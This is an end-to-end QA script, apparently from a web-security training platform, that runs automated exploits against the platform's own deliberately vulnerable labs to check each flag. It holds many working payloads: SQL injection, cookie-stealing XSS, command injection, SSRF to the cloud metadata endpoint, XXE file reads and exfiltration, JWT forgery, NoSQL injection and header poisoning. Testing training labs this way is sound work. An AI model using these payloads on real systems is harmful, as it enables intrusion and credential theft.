'use strict';

/*
 * ZeroDay Academy - end-to-end verification.
 *
 * This script starts the real Express application against an isolated
 * in-memory MongoDB, registers real users, launches real lab instances and
 * exploits every lab over HTTP (using jsdom where the vulnerability executes
 * in a browser). Flags are recovered only through the lab's intended
 * server-side mechanism and submitted through the real platform endpoint.
 *
 * Run: npm run qa
 */

const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const { spawnSync } = require('child_process');
const { JSDOM, CookieJar } = require('jsdom');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');

const ROOT = path.join(__dirname, '..');
const QA_PASSWORD = crypto.randomBytes(18).toString('hex');
const FOUNDER_PASSWORD = crypto.randomBytes(18).toString('hex');
const FOUNDER_RESET_PASSWORD = crypto.randomBytes(18).toString('hex');
const MAIN_NEW_PASSWORD = crypto.randomBytes(18).toString('hex');
const RUN_ID = crypto.randomBytes(4).toString('hex');

// Configuration must be established before any application module is loaded.
process.env.NODE_ENV = 'test';
process.env.MONGODB_URI = '';
process.env.SESSION_SECRET = crypto.randomBytes(48).toString('hex');
process.env.FLAG_SECRET = crypto.randomBytes(48).toString('hex');
process.env.BOOTSTRAP_ADMIN = 'true';
process.env.ADMIN_EMAIL = 'founder.zeroday@gmail.com';
process.env.ADMIN_USERNAME = 'founder';
process.env.ADMIN_PASSWORD = FOUNDER_PASSWORD;
process.env.PORT = '0';
process.env.LAB_INSTANCE_TTL_MINUTES = '120';

const { labs: definitions } = require('../data/labs');
const { createApp } = require('../server');
const { disconnectMongo, mongoose } = require('../db/mongo');
const Challenge = require('../models/Challenge');
const User = require('../models/User');
const Solve = require('../models/Solve');
const FlagSubmission = require('../models/FlagSubmission');
const AuditLog = require('../models/AuditLog');
const LabInstance = require('../models/LabInstance');
const { config } = require('../config');
const { flagFor } = require('../services/flagService');

const results = {
  startedAt: new Date(),
  checks: [],
  labs: [],
  passed: 0,
  failed: 0
};
let baseUrl = '';
let server = null;

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function record(name, ok, detail = '') {
  results.checks.push({ name, ok, detail: String(detail || '').slice(0, 1000) });
  if (ok) results.passed += 1;
  else results.failed += 1;
  const suffix = detail ? ` - ${detail}` : '';
  console.log(`${ok ? 'PASS' : 'FAIL'} ${name}${suffix}`);
}

function assert(condition, message) {
  if (!condition) throw new Error(message);
}

async function check(name, fn) {
  try {
    const detail = await fn();
    record(name, true, detail);
    return detail;
  } catch (error) {
    record(name, false, error.message);
    throw error;
  }
}

function flagFrom(text) {
  const match = String(text || '').match(/ZDS\{[^}\r\n]{1,180}\}/);
  return match ? match[0] : null;
}

function csrfFrom(html) {
  const match = String(html || '').match(/name="_csrf" value="([^"]+)"/);
  return match ? match[1] : '';
}

function escapeRegex(value) {
  return String(value).replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function regexClassChar(char) {
  if (char === '\\' || char === ']' || char === '^' || char === '-') return `\\${char}`;
  return char;
}

function base64url(value) {
  return Buffer.from(value).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
}

function parseJson(text) {
  try {
    return JSON.parse(text);
  } catch {
    return null;
  }
}

function cookieDefaultPath(requestPath) {
  const pathname = String(requestPath || '/').split('?')[0];
  if (!pathname.startsWith('/')) return '/';
  const lastSlash = pathname.lastIndexOf('/');
  if (lastSlash <= 0) return '/';
  return pathname.slice(0, lastSlash);
}

class Client {
  constructor(base, label) {
    this.base = base;
    this.label = label;
    this.cookies = [];
    this.csrfToken = '';
    this.lastUrl = '/';
  }

  cookieHeader(requestPath) {
    const now = Date.now();
    return this.cookies
      .filter(cookie => cookie.expires > now && String(requestPath || '/').startsWith(cookie.path))
      .map(cookie => `${cookie.name}=${cookie.value}`)
      .join('; ');
  }

  exportCookies() {
    return this.cookies.slice();
  }

  setCookie(name, value, cookiePath = '/') {
    this.cookies = this.cookies.filter(cookie => !(cookie.name === name && cookie.path === cookiePath));
    this.cookies.push({
      name,
      value: String(value),
      path: cookiePath,
      expires: Date.now() + 2 * 60 * 60 * 1000,
      httpOnly: false
    });
  }

  storeCookies(response, requestUrl) {
    const values = typeof response.headers.getSetCookie === 'function'
      ? response.headers.getSetCookie()
      : [];
    for (const line of values) {
      const parts = String(line).split(';');
      const pair = parts.shift() || '';
      const index = pair.indexOf('=');
      if (index <= 0) continue;
      const name = pair.slice(0, index).trim();
      const value = pair.slice(index + 1).trim();
      const pathMatch = line.match(/;\s*Path=([^;]+)/i);
      const cookiePath = pathMatch ? pathMatch[1].trim() : cookieDefaultPath(new URL(requestUrl).pathname);
      const maxAgeMatch = line.match(/;\s*Max-Age=(-?\d+)/i);
      const expiresMatch = line.match(/;\s*Expires=([^;]+)/i);
      let expires = Date.now() + 8 * 60 * 60 * 1000;
      if (maxAgeMatch) expires = Date.now() + Number(maxAgeMatch[1]) * 1000;
      else if (expiresMatch) expires = new Date(expiresMatch[1]).getTime();
      const httpOnly = /;\s*HttpOnly/i.test(line);

      this.cookies = this.cookies.filter(cookie => !(cookie.name === name && cookie.path === cookiePath));
      if (maxAgeMatch && Number(maxAgeMatch[1]) <= 0) continue;
      if (Number.isFinite(expires) && expires <= Date.now()) continue;
      this.cookies.push({ name, value, path: cookiePath, expires, httpOnly });
    }
  }

  async request(route, options = {}) {
    const url = new URL(route, this.base);
    const headers = Object.assign({}, options.headers || {});
    let body = options.body;
    if (options.form) {
      headers['Content-Type'] = 'application/x-www-form-urlencoded';
      body = new URLSearchParams(options.form).toString();
    } else if (options.json !== undefined) {
      headers['Content-Type'] = 'application/json';
      headers.Accept = headers.Accept || 'application/json';
      body = JSON.stringify(options.json);
    }
    const cookie = this.cookieHeader(url.pathname);
    if (cookie) headers.Cookie = cookie;
    this.lastUrl = url.pathname + url.search;
    const response = await fetch(url, {
      method: options.method || 'GET',
      headers,
      body,
      redirect: 'manual',
      signal: AbortSignal.timeout(options.timeout || 15000)
    });
    this.storeCookies(response, url);
    return response;
  }

  async text(route, options = {}) {
    const response = await this.request(route, options);
    return { response, text: await response.text() };
  }

  async ensureCsrf(route = '/dashboard') {
    if (this.csrfToken) return this.csrfToken;
    const { response, text } = await this.text(route);
    assert([200, 302, 303].includes(response.status), `${this.label}: could not load ${route} for CSRF (${response.status})`);
    this.csrfToken = csrfFrom(text);
    if (!this.csrfToken) {
      // A redirect can mean the session was regenerated; load the target.
      const location = response.headers.get('location');
      if (location) {
        const next = await this.text(location.startsWith('http') ? location : location);
        this.csrfToken = csrfFrom(next.text);
      }
    }
    return this.csrfToken;
  }

  async postForm(route, fields = {}, { csrf = true, accept = 'text/html' } = {}) {
    const payload = Object.assign({}, fields);
    if (csrf) payload._csrf = await this.ensureCsrf();
    return this.request(route, {
      method: 'POST',
      form: payload,
      headers: { Accept: accept }
    });
  }

  async postJson(route, value, { csrf = true } = {}) {
    const headers = { Accept: 'application/json' };
    if (csrf) headers['X-CSRF-Token'] = await this.ensureCsrf();
    return this.request(route, { method: 'POST', json: value, headers });
  }

  async getJson(route, options = {}) {
    const response = await this.request(route, Object.assign({}, options, { headers: Object.assign({ Accept: 'application/json' }, options.headers || {}) }));
    const text = await response.text();
    return { response, text, data: parseJson(text) };
  }

  async submitFlag(slug, flag) {
    const response = await this.postJson(`/challenges/${slug}/submit`, { flag });
    const text = await response.text();
    return { response, text, data: parseJson(text) };
  }

  async startLab(slug) {
    return this.postForm(`/challenges/${slug}/start`, {}, { accept: 'text/html' });
  }

  async logout() {
    const response = await this.postForm('/logout', {});
    this.csrfToken = '';
    return response;
  }
}

async function login(client, username, password) {
  client.csrfToken = '';
  await client.ensureCsrf('/login');
  const response = await client.request('/login', {
    method: 'POST',
    form: { _csrf: client.csrfToken, username, password, next: '/dashboard' },
    headers: { Accept: 'text/html' }
  });
  client.csrfToken = '';
  return response;
}

async function register(client, username, email, password) {
  client.csrfToken = '';
  await client.ensureCsrf('/register');
  const response = await client.request('/register', {
    method: 'POST',
    form: {
      _csrf: client.csrfToken,
      username,
      email,
      password,
      confirmPassword: password
    },
    headers: { Accept: 'text/html' }
  });
  client.csrfToken = '';
  return response;
}

function jsdomWithBridge(html, url, client) {
  const cookieJar = new CookieJar();
  for (const cookie of client.exportCookies()) {
    const pathName = cookie.path || '/';
    try {
      cookieJar.setCookieSync(
        `${cookie.name}=${cookie.value}; Path=${pathName}${cookie.httpOnly ? '; HttpOnly' : ''}`,
        url
      );
    } catch {
      // Ignore cookies jsdom cannot parse; the server bridge uses the real jar.
    }
  }

  return new JSDOM(html, {
    url,
    runScripts: 'dangerously',
    pretendToBeVisual: true,
    cookieJar,
    beforeParse(window) {
      window.fetch = async (input, init = {}) => {
        let target;
        try {
          target = new URL(String(input), url);
        } catch {
          return Promise.reject(new Error('Invalid URL'));
        }
        if (target.origin !== new URL(url).origin) {
          return Promise.reject(new Error('Blocked cross-origin lab request'));
        }
        const headers = Object.assign({}, init.headers || {});
        const browserCookies = client.cookieHeader(target.pathname);
        if (browserCookies) headers.Cookie = browserCookies;
        const response = await fetch(target, {
          method: init.method || 'GET',
          headers,
          body: init.body,
          redirect: 'manual',
          signal: AbortSignal.timeout(10000)
        });
        return {
          ok: response.ok,
          status: response.status,
          headers: response.headers,
          text: () => response.text(),
          json: () => response.json()
        };
      };
    }
  });
}

async function runBrowserHtml(html, route, client) {
  const url = new URL(route, client.base).toString();
  const dom = jsdomWithBridge(html, url, client);
  try {
    await delay(200);
    const document = dom.window.document;
    for (const element of document.querySelectorAll('img[onerror]')) {
      element.dispatchEvent(new dom.window.Event('error'));
    }
    for (const element of document.querySelectorAll('svg[onload]')) {
      element.dispatchEvent(new dom.window.Event('load'));
    }
    await delay(500);
  } finally {
    dom.window.close();
  }
}

async function statusFlag(client, slug) {
  const { response, data } = await client.getJson(`/labs/${slug}/status`);
  assert(response.status === 200, `${slug}: status endpoint returned ${response.status}`);
  assert(data && data.solved === true, `${slug}: proof collector never recorded successful exploitation`);
  assert(data.flag, `${slug}: status endpoint did not return a flag after proof`);
  return data.flag;
}

async function extractWithRegexProbe(probe, { maxLength = 120 } = {}) {
  let prefix = '';
  for (let index = 0; index < maxLength; index += 1) {
    let low = 32;
    let high = 126;
    while (low < high) {
      const mid = Math.floor((low + high) / 2);
      const range = `[${regexClassChar(String.fromCharCode(low))}-${regexClassChar(String.fromCharCode(mid))}]`;
      const matched = await probe(`^${escapeRegex(prefix)}${range}`);
      if (matched) high = mid;
      else low = mid + 1;
    }
    const character = String.fromCharCode(low);
    prefix += character;
    if (character === '}') break;
    assert(index < maxLength - 1, 'probe extraction did not terminate');
  }
  assert(/^ZDS\{[^}]+\}$/.test(prefix), `probe extraction produced invalid flag: ${prefix}`);
  return prefix;
}

async function extractWithSqlBooleanProbe(probe, { maxLength = 120 } = {}) {
  let flag = '';
  for (let index = 1; index <= maxLength; index += 1) {
    let low = 32;
    let high = 126;
    while (low < high) {
      const mid = Math.floor((low + high) / 2);
      const lessOrEqual = await probe(index, mid);
      if (lessOrEqual) high = mid;
      else low = mid + 1;
    }
    flag += String.fromCharCode(low);
    if (flag.endsWith('}')) break;
    assert(index < maxLength, 'SQL probe extraction did not terminate');
  }
  assert(/^ZDS\{[^}]+\}$/.test(flag), `SQL probe extraction produced invalid flag: ${flag}`);
  return flag;
}

async function extractWithTimeProbe(probe, { maxLength = 120 } = {}) {
  return extractWithSqlBooleanProbe(probe, { maxLength });
}

const exploits = {
  'sqli-login': async client => {
    const { text } = await client.text('/labs/sqli-login', {
      method: 'POST',
      form: { username: 'admin', password: "' OR '1'='1' -- " }
    });
    return flagFrom(text);
  },

  'sqli-union': async client => {
    const { text } = await client.text('/labs/sqli-union', {
      method: 'POST',
      form: { category: "' UNION SELECT label, value, id FROM sqli_secrets -- " }
    });
    return flagFrom(text);
  },

  'sqli-blind-boolean': async client => {
    return extractWithSqlBooleanProbe(async (position, mid) => {
      const id = `1 AND (SELECT unicode(substr(value,${position},1)) FROM sqli_secrets WHERE label='blind-flag') <= ${mid} -- `;
      const { text } = await client.text('/labs/sqli-blind-boolean/lookup', {
        method: 'POST',
        form: { id }
      });
      return text.includes('Order found.');
    });
  },

  'sqli-time-blind': async client => {
    return extractWithTimeProbe(async (position, mid) => {
      const username = `admin' AND (SELECT unicode(substr(value,${position},1)) FROM sqli_secrets WHERE label='time-flag') <= ${mid} AND sleep(300) -- `;
      const { text } = await client.text('/labs/sqli-time-blind/lookup', {
        method: 'POST',
        form: { username }
      });
      const elapsed = Number((text.match(/Request completed in (\d+)ms/) || [])[1] || 0);
      return elapsed >= 180;
    });
  },

  'reflected-xss': async (client, slug) => {
    const payload = `<img src=x onerror="fetch('/labs/${slug}/collect?p='+encodeURIComponent(document.cookie))">`;
    const { text } = await client.text(`/labs/${slug}?q=${encodeURIComponent(payload)}`);
    await runBrowserHtml(text, `/labs/${slug}?q=${encodeURIComponent(payload)}`, client);
    return statusFlag(client, slug);
  },

  'dom-xss-hash': async (client, slug) => {
    const payload = `<img src=x onerror="fetch('/labs/${slug}/collect?p='+encodeURIComponent(document.cookie))">`;
    const { text } = await client.text(`/labs/${slug}`);
    await runBrowserHtml(text, `/labs/${slug}#${encodeURIComponent(payload)}`, client);
    return statusFlag(client, slug);
  },

  'xss-filter-bypass': async (client, slug) => {
    // The blocklist removes literal <script> tags, so use an event handler.
    const payload = `<img src=x onerror="fetch('/labs/${slug}/collect?p='+encodeURIComponent(document.cookie))">`;
    const { text } = await client.text(`/labs/${slug}?name=${encodeURIComponent(payload)}`);
    await runBrowserHtml(text, `/labs/${slug}?name=${encodeURIComponent(payload)}`, client);
    return statusFlag(client, slug);
  },

  'stored-xss': async (client, slug) => {
    const payload = `<script>fetch('/labs/${slug}/collect?t='+encodeURIComponent(document.cookie))</script>`;
    await client.text(`/labs/${slug}`, {
      method: 'POST',
      form: { author: 'qa-bot', body: payload }
    });
    const bot = await client.text(`/labs/${slug}/bot`, { method: 'POST' });
    const botFlag = flagFrom(bot.text);
    if (botFlag) return botFlag;
    return statusFlag(client, slug);
  },

  'svg-upload-xss': async (client, slug) => {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('/labs/${slug}/collect?t='+encodeURIComponent(document.cookie))"></svg>`;
    const uploaded = await client.text(`/labs/${slug}`, {
      method: 'POST',
      form: { filename: 'qa-avatar.svg', svg }
    });
    const id = (uploaded.text.match(new RegExp(`/labs/${slug}/raw/([a-f0-9]{24})`, 'i')) || [])[1];
    assert(id, 'svg-upload-xss: uploaded file id was not rendered');
    const { text } = await client.text(`/labs/${slug}/raw/${id}`);
    await runBrowserHtml(text, `/labs/${slug}/raw/${id}`, client);
    return statusFlag(client, slug);
  },

  'idor-invoices': async client => {
    const { text } = await client.text('/labs/idor-invoices/1003');
    return flagFrom(text);
  },

  'horizontal-privesc': async client => {
    const { text } = await client.text('/labs/horizontal-privesc/note/admin');
    return flagFrom(text);
  },

  'forced-browse-admin': async client => {
    const robots = await client.text('/labs/forced-browse-admin/robots.txt');
    assert(robots.text.includes('panel-x29a'), 'forced-browse-admin: robots.txt did not hint at the panel');
    const { text } = await client.text('/labs/forced-browse-admin/panel-x29a');
    return flagFrom(text);
  },

  'vertical-privesc': async client => {
    const { text } = await client.text('/labs/vertical-privesc/admin/grant-flag', { method: 'POST' });
    return flagFrom(text);
  },

  'mass-assignment-role': async client => {
    const { text } = await client.text('/labs/mass-assignment-role/update', {
      method: 'POST',
      form: { json: JSON.stringify({ role: 'admin' }) }
    });
    return flagFrom(text);
  },

  'file-access-idor': async client => {
    const { text } = await client.text('/labs/file-access-idor/download/3');
    return flagFrom(text);
  },

  'csrf-email-change': async (client, slug) => {
    const simulated = await client.text(`/labs/${slug}/simulate-victim-visit`, { method: 'POST' });
    const direct = flagFrom(simulated.text);
    if (direct) return direct;
    const { text } = await client.text(`/labs/${slug}`);
    return flagFrom(text);
  },

  'csrf-get-based': async client => {
    const transferred = await client.text('/labs/csrf-get-based/transfer?to=attacker&amount=100');
    const target = transferred.response.headers.get('location') || '/labs/csrf-get-based';
    const { text } = await client.text(target);
    return flagFrom(text);
  },

  'cmd-injection': async client => {
    const { text } = await client.text('/labs/cmd-injection', {
      method: 'POST',
      form: { host: '127.0.0.1; cat .htpasswd' }
    });
    return flagFrom(text);
  },

  'ssrf-metadata': async client => {
    const { text } = await client.text('/labs/ssrf-metadata', {
      method: 'POST',
      form: { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/internal-deploy-role' }
    });
    return flagFrom(text);
  },

  'ssrf-webhook': async client => {
    const { text } = await client.text('/labs/ssrf-webhook', {
      method: 'POST',
      form: { url: 'http://internal-admin.local/internal/admin/flag' }
    });
    return flagFrom(text);
  },

  'ssrf-pdf-generator': async client => {
    const { text } = await client.text('/labs/ssrf-pdf-generator', {
      method: 'POST',
      form: { html: '<h1>Invoice</h1><img src="http://pdf-internal.local/config">' }
    });
    return flagFrom(text);
  },

  'xxe-profile-import': async client => {
    const xml = `<?xml version="1.0"?>
<!DOCTYPE profile [ <!ENTITY xxe SYSTEM "file:///secret.txt"> ]>
<profile><displayName>&xxe;</displayName><email>qa@example.test</email></profile>`;
    const { text } = await client.text('/labs/xxe-profile-import', {
      method: 'POST',
      form: { xml }
    });
    return flagFrom(text);
  },

  'xxe-svg-upload': async client => {
    const svg = `<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><title>&xxe;</title></svg>`;
    const { text } = await client.text('/labs/xxe-svg-upload', {
      method: 'POST',
      form: { svg }
    });
    return flagFrom(text);
  },

  'xxe-oob-exfil': async (client, slug) => {
    const port = new URL(client.base).port;
    const dtd = `<!ENTITY % file SYSTEM "file:///db_credentials.conf">
<!ENTITY % exfil SYSTEM "http://127.0.0.1:${port}/labs/${slug}/collector?data=%file;">
%exfil;`;
    await client.text(`/labs/${slug}/craft-dtd`, {
      method: 'POST',
      form: { dtd }
    });
    const xml = `<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://127.0.0.1:${port}/labs/${slug}/evil.dtd">
<data>qa</data>`;
    const imported = await client.text(`/labs/${slug}/import`, {
      method: 'POST',
      form: { xml }
    });
    assert(!imported.text.includes('The external DTD was not referenced'), 'xxe-oob-exfil: external DTD reference was rejected');
    const { data } = await client.getJson(`/labs/${slug}/check`);
    assert(data && data.flag, 'xxe-oob-exfil: collector never received the virtual file flag');
    return data.flag;
  },

  'ssti-render': async client => {
    const { text } = await client.text('/labs/ssti-render', {
      method: 'POST',
      form: { message: '{{flag()}}' }
    });
    return flagFrom(text);
  },

  'insecure-deserialization': async (client, slug) => {
    const session = Buffer.from(JSON.stringify({ username: 'guest', role: 'admin' })).toString('base64');
    client.setCookie('_sess_prefs', session, `/labs/${slug}`);
    const { text } = await client.text(`/labs/${slug}`);
    return flagFrom(text);
  },

  'jwt-alg-none': async client => {
    const header = base64url(JSON.stringify({ alg: 'none', typ: 'JWT' }));
    const payload = base64url(JSON.stringify({ username: 'admin', role: 'admin' }));
    const { text } = await client.text('/labs/jwt-alg-none/verify', {
      method: 'POST',
      form: { token: `${header}.${payload}.` }
    });
    return flagFrom(text);
  },

  'jwt-weak-secret': async client => {
    const token = jwt.sign({ username: 'admin', role: 'admin' }, 'letmein123', { algorithm: 'HS256', expiresIn: '1h' });
    const { text } = await client.text('/labs/jwt-weak-secret/verify', {
      method: 'POST',
      form: { token }
    });
    return flagFrom(text);
  },

  'broken-password-reset': async (client, slug) => {
    const requested = await client.text(`/labs/${slug}/request-reset`, {
      method: 'POST',
      form: { username: 'guest' }
    });
    const guestToken = (requested.text.match(/RST-\d+/) || [])[0];
    assert(guestToken, 'broken-password-reset: guest reset token was not issued');
    const adminToken = `RST-${Number(guestToken.slice(4)) - 1}`;
    const { text } = await client.text(`/labs/${slug}/complete-reset`, {
      method: 'POST',
      form: { token: adminToken, newPassword: 'QaResetPassword123!' }
    });
    return flagFrom(text);
  },

  'account-enum-timing': async (client, slug) => {
    for (let attempt = 0; attempt < 2; attempt += 1) {
      const login = await client.text(`/labs/${slug}/login`, {
        method: 'POST',
        form: { username: 'admin', password: 'wrong-password' }
      });
      const check = await client.text(`/labs/${slug}/check-username`, {
        method: 'POST',
        form: { guess: 'admin' }
      });
      const flag = flagFrom(check.text);
      if (flag) return flag;
      assert(login.text.includes('Request completed') || login.text.includes('elapsed') || login.text.includes('Invalid username'), 'account-enum-timing: login response missing timing output');
    }
    return null;
  },

  'no-rate-limit-bruteforce': async (client, slug) => {
    for (let start = 1000; start <= 9999; start += 100) {
      const candidates = [];
      for (let pin = start; pin < Math.min(start + 100, 10000); pin += 1) candidates.push(String(pin));
      const responses = await Promise.all(candidates.map(pin => client.text(`/labs/${slug}/try-pin`, {
        method: 'POST',
        form: { pin }
      })));
      for (const response of responses) {
        const flag = flagFrom(response.text);
        if (flag) return flag;
      }
    }
    return null;
  },

  'two-factor-bypass': async client => {
    const step1 = await client.text('/labs/two-factor-bypass/step1', {
      method: 'POST',
      form: { username: 'admin', password: 'adminpass' }
    });
    assert(step1.text.includes('Step 1 complete'), 'two-factor-bypass: valid primary credentials were rejected');
    const { text } = await client.text('/labs/two-factor-bypass/step2', {
      method: 'POST',
      form: { debugSkip: 'true' }
    });
    return flagFrom(text);
  },

  'nosql-login-bypass': async client => {
    const response = await client.request('/labs/nosql-login-bypass/login', {
      method: 'POST',
      json: { username: 'admin', password: { $ne: null } },
      headers: { Accept: 'text/html' }
    });
    const text = await response.text();
    return flagFrom(text);
  },

  'nosql-search-injection': async client => {
    const { text } = await client.text('/labs/nosql-search-injection?released[$ne]=true');
    return flagFrom(text);
  },

  'nosql-regex-extraction': async (client, slug) => {
    const flag = await extractWithRegexProbe(async pattern => {
      const { text } = await client.text(`/labs/${slug}/probe`, {
        method: 'POST',
        form: { pattern }
      });
      return text.includes('Match found.');
    });
    const checked = await client.text(`/labs/${slug}/check`, {
      method: 'POST',
      form: { answer: flag }
    });
    return flagFrom(checked.text) || flag;
  },

  'nosql-expr-injection': async (client, slug) => {
    const flag = await extractWithRegexProbe(async pattern => {
      const filter = JSON.stringify({ 'data.secret': { $regex: pattern } });
      const { text } = await client.text(`/labs/${slug}/probe`, {
        method: 'POST',
        form: { filter }
      });
      return text.includes('Record found.');
    });
    const checked = await client.text(`/labs/${slug}/check`, {
      method: 'POST',
      form: { answer: flag }
    });
    return flagFrom(checked.text) || flag;
  },

  'prototype-pollution': async client => {
    // Build the payload from parsed JSON: an object literal's __proto__ key
    // sets the prototype and would be dropped by JSON.stringify.
    const payload = JSON.stringify(JSON.parse('{"__proto__":{"isAdmin":true}}'));
    const { text } = await client.text('/labs/prototype-pollution/merge', {
      method: 'POST',
      form: { json: payload }
    });
    return flagFrom(text);
  },

  'api-excessive-data': async client => {
    const { data } = await client.getJson('/labs/api-excessive-data/api/profile/u_2291');
    assert(data, 'api-excessive-data: profile response was not JSON');
    return flagFrom(JSON.stringify(data));
  },

  'api-bola': async client => {
    const { data } = await client.getJson('/labs/api-bola/api/order/ord_1002');
    assert(data, 'api-bola: order response was not JSON');
    return flagFrom(JSON.stringify(data));
  },

  'api-mass-assignment': async (client, slug) => {
    await client.request(`/labs/${slug}/api/account`, {
      method: 'PATCH',
      json: { accountTier: 'enterprise' }
    });
    const { text } = await client.text(`/labs/${slug}`);
    return flagFrom(text);
  },

  'graphql-introspection': async client => {
    const schema = await client.request('/labs/graphql-introspection/graphql', {
      method: 'POST',
      json: { query: '{ __schema { queryType } }' }
    });
    const schemaText = await schema.text();
    assert(schemaText.includes('internalDebugFlag'), 'graphql-introspection: schema did not disclose internalDebugFlag');
    const { data } = await client.getJson('/labs/graphql-introspection/graphql', {
      method: 'POST',
      json: { query: '{ internalDebugFlag }' }
    });
    assert(data && data.data && data.data.internalDebugFlag, 'graphql-introspection: internal field did not return a flag');
    return data.data.internalDebugFlag;
  },

  'logic-negative-quantity': async (client, slug) => {
    await client.text(`/labs/${slug}/checkout`, {
      method: 'POST',
      form: { quantity: '-100' }
    });
    const { text } = await client.text(`/labs/${slug}`);
    return flagFrom(text);
  },

  'logic-price-tampering': async (client, slug) => {
    const { text } = await client.text(`/labs/${slug}/checkout`, {
      method: 'POST',
      form: { price: '0.01' }
    });
    return flagFrom(text);
  },

  'logic-workflow-skip': async (client, slug) => {
    const confirmed = await client.text(`/labs/${slug}/confirm`, { method: 'POST' });
    const direct = flagFrom(confirmed.text);
    if (direct) return direct;
    const { text } = await client.text(`/labs/${slug}`);
    return flagFrom(text);
  },

  'logic-coupon-race': async (client, slug) => {
    await Promise.all([1, 2, 3, 4].map(() => client.text(`/labs/${slug}/redeem`, { method: 'POST' })));
    const { text } = await client.text(`/labs/${slug}`);
    return flagFrom(text);
  },

  'upload-content-type-bypass': async (client, slug) => {
    const payload = `<script>fetch('/labs/${slug}/collect?t='+encodeURIComponent(document.cookie))</script>`;
    const uploaded = await client.text(`/labs/${slug}/upload?filename=qa-avatar.html`, {
      method: 'POST',
      body: payload,
      headers: { 'Content-Type': 'text/plain', 'X-Declared-Type': 'image/png' }
    });
    assert(uploaded.response.status === 200, `upload-content-type-bypass: upload returned ${uploaded.response.status}`);
    const id = (uploaded.text.match(new RegExp(`/labs/${slug}/view/([a-f0-9]{24})`, 'i')) || [])[1];
    assert(id, 'upload-content-type-bypass: uploaded file id was not rendered');
    const { text } = await client.text(`/labs/${slug}/view/${id}`);
    await runBrowserHtml(text, `/labs/${slug}/view/${id}`, client);
    return statusFlag(client, slug);
  },

  'upload-path-traversal': async (client, slug) => {
    await client.text(`/labs/${slug}/upload?filename=${encodeURIComponent('../protected/flag.txt')}`, {
      method: 'POST',
      body: 'overwritten-by-qa',
      headers: { 'Content-Type': 'text/plain' }
    });
    const { text } = await client.text(`/labs/${slug}`);
    return flagFrom(text);
  },

  'upload-unrestricted-rce': async (client, slug) => {
    await client.text(`/labs/${slug}/upload?filename=qa-widget.js`, {
      method: 'POST',
      body: 'reportFlag("confirm");',
      headers: { 'Content-Type': 'text/plain' }
    });
    // The upload route redirects, so read the lab root to discover the stored id.
    const uploaded = await client.text(`/labs/${slug}`);
    const id = (uploaded.text.match(new RegExp(`/labs/${slug}/run/([a-f0-9]{24})`, 'i')) || [])[1];
    assert(id, 'upload-unrestricted-rce: uploaded widget id was not rendered');
    const { text } = await client.text(`/labs/${slug}/run/${id}`, { method: 'POST' });
    return flagFrom(text);
  },

  'disclosure-verbose-errors': async client => {
    const { text } = await client.text('/labs/disclosure-verbose-errors/lookup', {
      method: 'POST',
      form: { id: '' }
    });
    return flagFrom(text);
  },

  'disclosure-env-file': async client => {
    const { text } = await client.text('/labs/disclosure-env-file/.env');
    return flagFrom(text);
  },

  'disclosure-backup-file': async client => {
    const { text } = await client.text('/labs/disclosure-backup-file/billing.js.bak');
    return flagFrom(text);
  },

  'disclosure-source-map': async (client, slug) => {
    const { text } = await client.text(`/labs/${slug}/js/app.bundle.js.map`);
    const key = (text.match(/debug\?key=([a-f0-9]+)/) || [])[1];
    assert(key, 'disclosure-source-map: debug key was not present in the source map');
    const { data } = await client.getJson(`/labs/${slug}/debug?key=${key}`);
    assert(data && data.flag, 'disclosure-source-map: debug endpoint did not return a flag');
    return data.flag;
  },

  'cors-wildcard-credentials': async (client, slug) => {
    const response = await client.request(`/labs/${slug}/api/secret`, {
      headers: { Origin: 'https://evil-attacker.test', Accept: 'application/json' }
    });
    const text = await response.text();
    const data = parseJson(text);
    assert(response.headers.get('access-control-allow-origin') === 'https://evil-attacker.test', 'cors-wildcard-credentials: attacker origin was not reflected');
    assert(response.headers.get('access-control-allow-credentials') === 'true', 'cors-wildcard-credentials: credentials were not allowed');
    assert(data && data.flag, 'cors-wildcard-credentials: cross-origin response did not contain a flag');
    return data.flag;
  },

  'clickjacking-missing-xfo': async (client, slug) => {
    const deleted = await client.text(`/labs/${slug}/delete-account`, {
      method: 'POST',
      form: { framed: '1' }
    });
    const target = deleted.response.headers.get('location') || `/labs/${slug}/frame-target`;
    const { response, text } = await client.text(target);
    assert(!response.headers.get('x-frame-options'), 'clickjacking-missing-xfo: framed target unexpectedly has X-Frame-Options');
    return flagFrom(text);
  },

  'crlf-header-injection': async (client, slug) => {
    const destination = encodeURIComponent('/inbox\r\nX-Injected-By: qa\r\nSet-Cookie: crlf=1');
    try {
      await client.request(`/labs/${slug}/go?dest=${destination}`, { timeout: 5000 });
    } catch {
      // The raw-socket response can intentionally violate fetch's parser. The
      // server-side exploitation flag is the authoritative signal.
    }
    const { data } = await client.getJson(`/labs/${slug}/status`);
    assert(data && data.exploited === true, 'crlf-header-injection: server did not record the CRLF sequence');
    assert(data.flag, 'crlf-header-injection: status did not return a flag');
    return data.flag;
  },

  'host-header-poisoning': async (client, slug) => {
    const { text } = await client.text(`/labs/${slug}/request-reset`, {
      method: 'POST',
      form: { email: 'victim@zeroday-corp.test' },
      headers: { 'X-Forwarded-Host': 'evil-attacker.test' }
    });
    return flagFrom(text);
  }
};

function topoOrder() {
  const bySlug = new Map(definitions.map((lab, index) => [lab.slug, { lab, index }]));
  const indegree = new Map();
  const dependents = new Map();
  for (const lab of definitions) {
    indegree.set(lab.slug, 0);
    dependents.set(lab.slug, []);
  }
  for (const lab of definitions) {
    for (const prerequisite of lab.prerequisites || []) {
      assert(bySlug.has(prerequisite), `${lab.slug}: unknown prerequisite ${prerequisite}`);
      indegree.set(lab.slug, indegree.get(lab.slug) + 1);
      dependents.get(prerequisite).push(lab.slug);
    }
  }
  const ready = definitions
    .filter(lab => indegree.get(lab.slug) === 0)
    .map(lab => lab.slug);
  ready.sort((a, b) => bySlug.get(a).index - bySlug.get(b).index);
  const order = [];
  while (ready.length) {
    const slug = ready.shift();
    order.push(slug);
    for (const dependent of dependents.get(slug)) {
